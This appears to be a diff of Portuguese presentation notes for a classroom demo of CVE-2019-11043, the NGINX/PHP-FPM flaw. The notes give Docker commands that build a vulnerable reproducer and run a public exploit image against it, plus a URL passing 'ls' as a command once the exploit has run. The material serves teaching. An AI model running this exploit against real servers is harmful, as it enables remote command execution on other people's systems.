@@ -1,3 +1,12 @@
+
+
+# Slides
+
+Começar pelo slide 6 (explicar NGINX, CGI, FastCGI, php-FPM)
+
+Explicas buffer underflow
+
+# DEMO
 Executar antes pq demora 3 dias pra buildar:
 
 cd reproducer
@@ -11,7 +20,23 @@ docker run --rm --name cve-mac0352 -ti -p 1213:80 reproduce-cve-2019-11043
 docker run --link cve-mac0352 --rm ypereirareis/cve-2019-11043 http://cve-mac0352:80/script.php
 
 ------------------------------------------------------------
-
 docker run --rm -ti reproduce-cve-2019-11043 bash
+
+(parar o container do nginx antes executar o comando abaixo)
+docker run --rm --name cve-mac0352 -ti -p 1213:80 reproduce-cve-2019-11043 bash
+
 cd php-src
+vim sapi/fpm/fpm/fpm_main.c
+ 1208gg
+
 git diff ab061f95ca966731b1c84cf5b7b20155c0a1c06a
+
+git checkout ab061f95ca966731b1c84cf5b7b20155c0a1c06a
+make -j4 && make install
+/entrypoint
+
+------------------------------------------------------------
+
+Acessar: 
+http://localhost:1213/script.php
+http://localhost:1213/script.php?a=ls (depois do exploit)
